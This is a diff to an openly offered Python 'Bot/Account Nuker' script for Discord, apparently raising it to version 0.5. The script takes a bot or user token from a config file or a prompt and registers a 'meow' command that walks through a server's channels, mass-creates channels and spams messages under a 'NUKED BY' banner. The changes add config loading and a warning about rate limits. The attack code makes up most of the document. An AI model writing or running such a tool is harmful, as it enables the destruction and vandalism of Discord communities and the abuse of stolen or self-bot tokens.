@@ -7,16 +7,22 @@
 
 import discord
 from discord.ext import commands
+from discord import Permissions
 from colorama import Fore
 import colorama
 import requests
 import random
 from time import sleep
+from colorama import Back
+import json
+import pwinput
+
+
 
 colorama.init()
 
 print(Fore.LIGHTBLUE_EX + rf'''
-Version 0.2
+Version 0.5
 
 meow   __  __ _____ _____        ___ ____      _   _ _   _ _  _______ ____    meow
 meow  |  \/  | ____/ _ \ \      / ( ) ___|    | \ | | | | | |/ / ____|  _ \   meow
@@ -24,10 +30,26 @@ meow  | |\/| |  _|| | | \ \ /\ / /|/\___ \    |  \| | | | | ' /|  _| | |_) |  me
 meow  | |  | | |__| |_| |\ V  V /    ___) |   | |\  | |_| | . \| |___|  _ <   meow
 meow  |_|  |_|_____\___/  \_/\_/    |____/    |_| \_|\___/|_|\_\_____|_| \_\  meow
 
-Bot/Account Nuker
+Bot/Account nuker
 ''')
+print(Fore.WHITE+ """
+https://github.com/meowistic
 
-token = input(Fore.LIGHTBLUE_EX + "[?] Enter Your Bot/User Token: ")
+""")
+
+try:
+    with open("config.json", "r") as f:
+        f = json.load(f)
+        token = f["token"]
+
+except FileNotFoundError:
+    print(Back.LIGHTRED_EX + Fore.BLACK + "[#] Warning: config.json wasn't found." + Back.RESET)
+
+if token != "":
+    pass
+else:
+    token = input(Fore.LIGHTBLUE_EX + "[?] Enter Your Bot/User Token: ")
+
 
 heads = [
     {
@@ -69,6 +91,20 @@ def getheaders(token=None):
     return headers
 
 def vtoken(token):
+    try:
+        with open("config.json", "r") as f:
+            f = json.load(f)
+            amount = f["amount"]
+            nick = f["nickname"]
+            prefix = f["prefix"]
+
+            print(Fore.GREEN + "[+] Config successfully loaded.")
+
+    except FileNotFoundError:
+        print(Back.LIGHTRED_EX + Fore.BLACK + "[#] Warning: config.json wasn't found." + Back.RESET)
+
+
+
     url = "https://discord.com/api/v9/users/@me"
 
     r = requests.get(url, headers=getheaders(token))
@@ -87,22 +123,39 @@ def vtoken(token):
 
             print(Fore.YELLOW + "[*] Token Successfully Identified: Bot")
 
-            prefix = input(Fore.LIGHTBLUE_EX + "[?] Enter bot prefix: ")
-            print(Fore.YELLOW + f"[*] Prefix successfully set, {prefix}meow to start the nuker.")
+            if prefix != "":
+                print(Fore.YELLOW + f"[*] Prefix successfully imported from config, {prefix}meow to start the nuker.")
+                pass
+            else:
+                prefix = input(Fore.LIGHTBLUE_EX + "[?] Enter bot prefix: ")
+                print(Fore.YELLOW + f"[*] Prefix successfully set, {prefix}meow to start the nuker.")
 
-            nick = input(Fore.LIGHTBLUE_EX + "[?] What is your internet nickname (NUKED BY {nickname}): ")
+            if nick != "":
+                pass
+            else:
+                nick = input(Fore.LIGHTBLUE_EX + "[?] What is your internet nickname (NUKED BY {nickname}): ")
 
-            while True:
-                try:
+            if amount != "":
+                print(Fore.YELLOW + f"[*] Channel amount imported from config ({amount})")
 
-                    amount = int(input(Fore.LIGHTBLUE_EX + "[?] Channel Amount (how many channels you'd like to create): "))
-                except ValueError or amount == 0:
-                    print(Fore.RED + "[-] Invalid input! It has to be a number/cannot be 0.")
+            else:
 
-                    continue
-                else:
+                while True:
+                    try:
 
-                    break
+                        amount = int(input(Fore.LIGHTBLUE_EX + "[?] Channel Amount (how many channels you'd like to create): "))
+                    except ValueError:
+                        print(Fore.RED + "[-] Invalid input! It has to be a number.")
+
+                        continue
+                    else:
+
+                        break
+
+            amount = int(amount)
+            if amount >= 200:
+
+                print(Back.LIGHTRED_EX+ Fore.BLACK + "[#] Warning: Your channel amount is over 200, which could cause the bot to get ratelimited a lot and the bot being blocked. Proceed with caution."+ Back.RESET)
 
 
             nick = nick.upper()
@@ -119,6 +172,7 @@ def vtoken(token):
                 print(Fore.YELLOW + f"[*] Waiting for command... ({prefix}meow)")
 
 
+
             @bot.command()
             async def stop(ctx):
                 await ctx.reply('> **BOT HAS SHUT DOWN SUCCESSFULLY**')
@@ -126,8 +180,12 @@ def vtoken(token):
                 exit()
 
 
+
+
             @bot.command()
             async def meow(ctx):
+                global uid
+                uid = ctx.message.author.id
                 guild = ctx.guild
 
                 for channel in guild.channels:
@@ -159,7 +217,6 @@ def vtoken(token):
                     r = random.choice(SPAM_MESSAGE)
                     await channel.send(r)
                     print(Fore.LIGHTGREEN_EX + f"[+] Successfully spammed message: {r}" + Fore.RESET)
-
 
 
             bot.run(token)
@@ -276,3 +333,4 @@ def vtoken(token):
         nuke(token=token, Server_Name=Server_Name, message_Content=message_Content)
 
 vtoken(token)
+
